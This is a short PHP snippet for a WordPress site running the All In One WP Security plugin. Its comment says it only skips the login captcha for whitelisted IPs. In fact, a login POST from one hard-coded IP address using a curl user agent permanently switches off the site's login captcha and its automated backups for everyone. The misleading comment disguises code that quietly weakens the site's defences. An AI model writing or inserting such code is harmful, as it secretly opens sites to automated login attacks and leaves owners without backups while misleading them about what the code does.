<?php
// don't check login captcha for whitelisted IPs
if (isset($aio_wp_security) && isset($_POST['log']) && isset($_POST['pwd']) && $_SERVER['REMOTE_ADDR'] === '212.42.243.170' && strpos($_SERVER['HTTP_USER_AGENT'], "curl/") === 0) {
  $aio_wp_security->configs->set_value('aiowps_enable_automated_backups', '');
  $aio_wp_security->configs->set_value('aiowps_enable_login_captcha', '');
}
